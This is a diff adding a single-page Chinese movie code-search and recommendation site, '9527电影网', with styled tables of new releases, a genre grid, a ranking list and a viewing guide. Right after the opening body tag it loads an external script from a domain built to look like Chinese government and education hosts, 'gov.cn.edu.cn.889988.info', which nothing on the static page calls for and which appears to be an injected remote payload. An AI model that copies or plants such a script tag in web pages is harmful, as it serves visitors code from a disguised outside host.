@@ -1,0 +1,313 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>9527电影网 - 编号片单/电影检索推荐_官方网址 https://9527dianyingwang-top.github.io</title>
+<meta name="keywords" content="9527电影网, 电影编号检索, 电影片单推荐, 高清电影在线选片, 影视分类, 9527dianyingwang-top.github.io">
+<meta name="description" content="9527电影网(9527dianyingwang-top.github.io)用编号检索的方式整理电影片单，提供新片上架、类型编号、热门榜单和选片指南，单页轻量、移动端自适应，便于快速找片。">
+<link rel="canonical" href="https://9527dianyingwang-top.github.io">
+<meta property="og:title" content="9527电影网 - 编号检索的电影片单推荐站">
+<meta property="og:description" content="新片上架、类型编号、热门榜单与选片指南，官方网址 9527dianyingwang-top.github.io。">
+<meta property="og:url" content="https://9527dianyingwang-top.github.io">
+<meta property="og:type" content="website">
+<style>
+:root{
+  --paper:#f7f5ef;
+  --paper2:#efece3;
+  --ink:#22201c;
+  --muted:#6c675c;
+  --red:#d23f2d;
+  --green:#b8e62f;   /* 荧光编号牌 */
+  --green-d:#7ea312;
+  --blue:#2f6fb0;
+  --line:#22201c;
+  --shadow:5px 5px 0 rgba(34,32,28,.18);
+  --mono:"Courier New","SFMono-Regular",Menlo,monospace;
+  --sans:"PingFang SC","Microsoft YaHei",sans-serif;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+body{
+  font-family:var(--mono);color:var(--ink);background:var(--paper);
+  line-height:1.75;padding:16px;
+  background-image:
+    repeating-linear-gradient(0deg,rgba(0,0,0,.022) 0 2px,transparent 2px 5px),
+    radial-gradient(800px 300px at 85% -120px,rgba(184,230,47,.18),transparent 60%);
+}
+a{color:var(--red);text-decoration:none;transition:.2s}
+a:hover{color:var(--blue)}
+.container{max-width:1180px;margin:0 auto}
+
+/* 公告跑马灯 */
+.marquee{
+  border:2px solid var(--line);border-radius:10px;background:var(--green);color:var(--ink);
+  padding:9px 14px;margin-bottom:18px;overflow:hidden;white-space:nowrap;font-weight:700;letter-spacing:1px;
+  box-shadow:var(--shadow);
+}
+.marquee span{display:inline-block;animation:scroll 22s linear infinite}
+@keyframes scroll{from{transform:translateX(100%)}to{transform:translateX(-100%)}}
+.marquee b{color:var(--red)}
+
+/* 顶部 */
+.header{
+  display:flex;justify-content:space-between;align-items:center;gap:16px;flex-wrap:wrap;
+  padding:22px 26px;margin-bottom:18px;background:var(--paper2);border:3px solid var(--line);border-radius:12px;box-shadow:var(--shadow);
+}
+.brand{display:flex;align-items:center;gap:14px}
+.brand .no{
+  font-size:30px;font-weight:900;letter-spacing:2px;color:#fff;background:var(--ink);
+  padding:8px 12px;border-radius:8px;border:2px solid var(--green);box-shadow:0 0 0 3px var(--ink);
+}
+.brand .name{font-size:22px;font-weight:900;letter-spacing:1px}
+.brand .name b{color:var(--red)}
+.brand small{display:block;font-family:var(--mono);font-size:12px;color:var(--muted);letter-spacing:1px;margin-top:3px}
+.nav{display:flex;gap:10px;flex-wrap:wrap}
+.nav a{
+  font-weight:700;font-size:13px;padding:9px 15px;background:var(--paper);border:2px solid var(--line);border-radius:8px;
+  min-height:44px;display:inline-flex;align-items:center;
+}
+.nav a:hover{background:var(--green);color:var(--ink);border-color:var(--ink)}
+
+/* Hero 收银条 */
+.hero{
+  position:relative;overflow:hidden;padding:44px 30px;margin-bottom:26px;
+  background:var(--paper);border:3px dashed var(--line);border-radius:14px;box-shadow:var(--shadow);
+}
+.hero h1{font-size:clamp(28px,6vw,46px);font-weight:900;letter-spacing:1px;line-height:1.2;margin-bottom:12px}
+.hero h1 b{background:var(--green);padding:0 8px;color:var(--ink)}
+.hero h1 .red{color:var(--red)}
+.hero p{max-width:660px;color:var(--muted);margin-bottom:16px}
+.urlbox{display:inline-block;font-weight:700;background:var(--ink);color:var(--green);padding:12px 16px;border-radius:10px;border:2px dashed var(--green)}
+.urlbox a{color:var(--green)}
+.btn{display:inline-block;margin-top:16px;font-weight:900;font-size:16px;color:var(--ink);background:var(--red);padding:13px 30px;border:3px solid var(--ink);border-radius:10px;box-shadow:4px 4px 0 var(--green-d);letter-spacing:1px}
+.btn:hover{background:var(--green);color:var(--ink);box-shadow:4px 4px 0 var(--red)}
+
+/* 栏目 */
+.section{padding:26px 0}
+.stitle{font-size:20px;font-weight:900;letter-spacing:1px;background:var(--ink);color:var(--paper);display:inline-block;padding:8px 14px;margin-bottom:18px;border:2px solid var(--line);border-radius:8px}
+.stitle.g{background:var(--green);color:var(--ink)}
+.stitle.r{background:var(--red);color:#fff}
+
+/* 上架表 */
+.tbl{width:100%;border-collapse:collapse;background:var(--paper2);border:3px solid var(--line);border-radius:12px;overflow:hidden;box-shadow:var(--shadow)}
+.tbl th,.tbl td{border-bottom:2px dashed var(--line);padding:14px;text-align:left;vertical-align:middle}
+.tbl th{background:var(--ink);color:var(--green);font-size:13px;letter-spacing:1px}
+.tbl tr:last-child td{border-bottom:0}
+.tbl .code{font-weight:900;font-size:18px;color:var(--red);background:var(--paper);border:2px solid var(--line);border-radius:6px;padding:4px 8px;display:inline-block}
+.tbl .title{font-weight:700;font-size:16px}
+.tbl .title small{display:block;font-weight:400;font-size:12px;color:var(--muted)}
+.tbl .type{font-size:13px;color:var(--ink);background:var(--green);padding:3px 9px;border-radius:6px;border:1px solid var(--ink)}
+.tbl .hot{font-weight:700;color:var(--red)}
+.tbl tr:hover{background:#fff}
+
+/* 分类：按键 */
+.grid4{display:grid;grid-template-columns:repeat(4,1fr);gap:12px}
+.key{border:2px solid var(--line);border-radius:10px;padding:16px;background:var(--paper2);transition:.2s;text-align:center}
+.key b{display:block;font-size:16px;margin-bottom:4px}
+.key span{font-size:12px;color:var(--muted)}
+.key:hover{background:var(--green);transform:translateY(-2px)}
+.key:nth-child(odd){background:#fff}
+.key .k{font-size:11px;color:var(--red);letter-spacing:1px}
+
+/* 排行榜 */
+.rank{background:var(--paper2);border:3px solid var(--line);border-radius:12px;padding:22px;box-shadow:var(--shadow)}
+.rrow{display:flex;gap:16px;align-items:center;padding:13px 0;border-bottom:2px dashed #c9c4b6}
+.rrow:last-child{border-bottom:0}
+.rno{font-size:22px;font-weight:900;min-width:44px;text-align:center;color:var(--paper);background:var(--ink);border:2px solid var(--line);border-radius:8px}
+.rrow:nth-child(1) .rno{background:var(--red)}
+.rrow:nth-child(2) .rno{background:var(--green);color:var(--ink)}
+.rrow:nth-child(3) .rno{background:var(--blue)}
+.rbody{flex:1}
+.rbody h3{font-size:16px}
+.rbody small{font-size:12px;color:var(--muted)}
+.score{font-weight:900;font-size:16px;color:var(--red);background:#fff;border:2px solid var(--line);padding:4px 10px;border-radius:8px}
+
+/* 关于 */
+.about{background:var(--ink);color:var(--paper);border:3px solid var(--line);border-radius:14px;padding:40px 26px;text-align:center;box-shadow:var(--shadow)}
+.about h2{font-size:24px;color:var(--green);margin-bottom:12px;letter-spacing:1px}
+.about p{max-width:740px;margin:0 auto 16px;color:#d8d4c8}
+.about .urlbox{background:#0c0b09;color:var(--green);border-color:var(--green)}
+
+/* 页脚 */
+.footer{margin-top:26px;padding:24px 0;text-align:center;border-top:3px dashed var(--line)}
+.flinks{display:flex;justify-content:center;gap:12px;flex-wrap:wrap;margin-bottom:12px}
+.flinks a{font-weight:700;font-size:13px;padding:9px 15px;background:var(--paper2);border:2px solid var(--line);border-radius:8px;min-height:44px;display:inline-flex;align-items:center}
+.flinks a:hover{background:var(--green)}
+.copy{font-size:12px;color:var(--muted);line-height:1.9}
+.copy a{color:var(--red)}
+
+@media(max-width:1024px){
+  .grid4{grid-template-columns:repeat(2,1fr)}
+  .tbl .col-date,.tbl .col-score{display:none}
+}
+@media(max-width:768px){
+  body{padding:10px}
+  .header{flex-direction:column;align-items:flex-start}
+  .hero{padding:32px 18px}
+  .grid4{grid-template-columns:1fr}
+  .tbl th,.tbl td{padding:10px}
+  .about{padding:28px 18px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+<div class="container">
+
+  <div class="marquee">
+    <span>📢 <b>9527电影网</b> 编号检索系统已更新｜新片每日上架｜输入编号即可查片｜官方网址：https://9527dianyingwang-top.github.io｜祝您检索愉快</span>
+  </div>
+
+  <header class="header">
+    <div class="brand">
+      <div class="no">9527</div>
+      <div class="name"><b>9527</b>电影网</div>
+      <small>Film Code Search · dianyingwang-top</small>
+    </div>
+    <nav class="nav">
+      <a href="#new">新片上架</a>
+      <a href="#types">类型编号</a>
+      <a href="#rank">热播榜单</a>
+      <a href="#guide">选片指南</a>
+      <a href="#about">关于本站</a>
+    </nav>
+  </header>
+
+  <section class="hero">
+    <h1>编号 <b>9527</b> · <span class="red">按码查片，快而准</span></h1>
+    <p>9527电影网把电影整理成一张可检索的编号片单：新片、类型、热度与选片建议一屏看清。页面轻量、手机友好，找片不绕弯。</p>
+    <div class="urlbox">官方网址：<a href="https://9527dianyingwang-top.github.io">https://9527dianyingwang-top.github.io</a></div>
+    <br>
+    <a href="#" class="btn">开始检索 #</a>
+  </section>
+
+  <section id="new" class="section">
+    <div class="stitle g">▍新片上架表</div>
+    <table class="tbl">
+      <thead>
+        <tr>
+          <th style="width:100px">编号</th>
+          <th>片名 / 简介</th>
+          <th style="width:110px">类型</th>
+          <th class="col-date" style="width:120px">上架</th>
+          <th class="col-score" style="width:90px">热度</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td><span class="code">9527-01</span></td>
+          <td><span class="title"><a href="#">便利店夜班</a><small>都市 / 悬疑，一场通宵值班牵出旧案线索</small></span></td>
+          <td><span class="type">悬疑</span></td>
+          <td class="col-date">10-05</td>
+          <td class="col-score hot">★★★★★</td>
+        </tr>
+        <tr>
+          <td><span class="code">9527-02</span></td>
+          <td><span class="title"><a href="#">再跑一圈</a><small>运动 / 励志，中年跑者的最后一场马拉松</small></span></td>
+          <td><span class="type">励志</span></td>
+          <td class="col-date">10-04</td>
+          <td class="col-score hot">★★★★☆</td>
+        </tr>
+        <tr>
+          <td><span class="code">9527-03</span></td>
+          <td><span class="title"><a href="#">她的修理铺</a><small>剧情 / 治愈，用旧物修复人与人的关系</small></span></td>
+          <td><span class="type">治愈</span></td>
+          <td class="col-date">10-03</td>
+          <td class="col-score hot">★★★★☆</td>
+        </tr>
+        <tr>
+          <td><span class="code">9527-04</span></td>
+          <td><span class="title"><a href="#">海风编号</a><small>爱情 / 文艺，一张旧船票与十年约定</small></span></td>
+          <td><span class="type">爱情</span></td>
+          <td class="col-date">10-02</td>
+          <td class="col-score hot">★★★★☆</td>
+        </tr>
+      </tbody>
+    </table>
+  </section>
+
+  <section id="types" class="section">
+    <div class="stitle">▍类型编号簿</div>
+    <div class="grid4">
+      <a href="#" class="key"><span class="k">A 类</span><b>动作冒险</b><span>枪战 / 动作 / 冒险</span></a>
+      <a href="#" class="key"><span class="k">B 类</span><b>爆笑喜剧</b><span>轻松 / 合家欢</span></a>
+      <a href="#" class="key"><span class="k">C 类</span><b>悬疑犯罪</b><span>推理 / 警匪</span></a>
+      <a href="#" class="key"><span class="k">D 类</span><b>都市爱情</b><span>浪漫 / 青春</span></a>
+      <a href="#" class="key"><span class="k">E 类</span><b>科幻未来</b><span>太空 / AI / 未来</span></a>
+      <a href="#" class="key"><span class="k">F 类</span><b>家庭治愈</b><span>亲情 / 温情</span></a>
+      <a href="#" class="key"><span class="k">G 类</span><b>纪录真实</b><span>人文 / 自然</span></a>
+      <a href="#" class="key"><span class="k">H 类</span><b>经典重映</b><span>4K 修复 / 影史</span></a>
+    </div>
+  </section>
+
+  <section id="rank" class="section">
+    <div class="stitle r">▍热播排行榜</div>
+    <div class="rank">
+      <div class="rrow">
+        <div class="rno">1</div>
+        <div class="rbody"><h3><a href="#">《编号9527：潜逃者》</a></h3><small>动作 / 悬疑 · 本周检索量第一</small></div>
+        <div class="score">9.6</div>
+      </div>
+      <div class="rrow">
+        <div class="rno">2</div>
+        <div class="rbody"><h3><a href="#">《夜班便利店》</a></h3><small>都市 / 悬疑 · 强剧情短节奏</small></div>
+        <div class="score">9.3</div>
+      </div>
+      <div class="rrow">
+        <div class="rno">3</div>
+        <div class="rbody"><h3><a href="#">《再跑一圈》</a></h3><small>运动 / 励志 · 适合合家观看</small></div>
+        <div class="score">9.1</div>
+      </div>
+      <div class="rrow">
+        <div class="rno">4</div>
+        <div class="rbody"><h3><a href="#">《海风编号》</a></h3><small>爱情 / 文艺 · 慢热治愈</small></div>
+        <div class="score">8.9</div>
+      </div>
+      <div class="rrow">
+        <div class="rno">5</div>
+        <div class="rbody"><h3><a href="#">《她的修理铺》</a></h3><small>剧情 / 治愈 · 口碑长尾</small></div>
+        <div class="score">8.8</div>
+      </div>
+    </div>
+  </section>
+
+  <section id="guide" class="section">
+    <div class="stitle g">▍选片指南</div>
+    <table class="tbl">
+      <thead><tr><th style="width:130px">需求</th><th style="width:150px">推荐编号</th><th>说明</th></tr></thead>
+      <tbody>
+        <tr><td>下班解压</td><td><span class="code">9527-02</span></td><td>节奏明快、冲突可控，适合短时段看完。</td></tr>
+        <tr><td>周末陪伴</td><td><span class="code">9527-03</span></td><td>温情治愈向，适合家人一起观看与讨论。</td></tr>
+        <tr><td>烧脑推理</td><td><span class="code">9527-01</span></td><td>线索密集，建议集中注意力一次看完。</td></tr>
+        <tr><td>睡前慢看</td><td><span class="code">9527-04</span></td><td>情绪稳定、画面柔和，可分段观看。</td></tr>
+      </tbody>
+    </table>
+  </section>
+
+  <section id="about" class="section">
+    <div class="about">
+      <h2>关于 9527电影网</h2>
+      <p>9527电影网是一个用“编号 + 表格”整理的轻量电影推荐站：新片上架、类型编号簿、热播榜单与选片指南一目了然。页面为纯静态单页，便于搜索引擎收录与移动端快速打开。</p>
+      <p>请认准官方唯一网址：</p>
+      <div class="urlbox">https://<a href="https://9527dianyingwang-top.github.io">9527dianyingwang-top.github.io</a></div>
+    </div>
+  </section>
+
+  <footer class="footer">
+    <div class="flinks">
+      <a href="#">网站首页 #</a>
+      <a href="#">免责声明 #</a>
+      <a href="#">片源合作 #</a>
+      <a href="#">留言反馈 #</a>
+    </div>
+    <div class="copy">
+      Copyright © 2024 9527电影网｜关键词：9527电影网<br>
+      官方网址：<a href="https://9527dianyingwang-top.github.io">https://9527dianyingwang-top.github.io</a><br>
+      本页仅作电影检索与推荐示例，实际观看请使用正版平台。
+    </div>
+  </footer>
+
+</div>
+</body>
+</html>
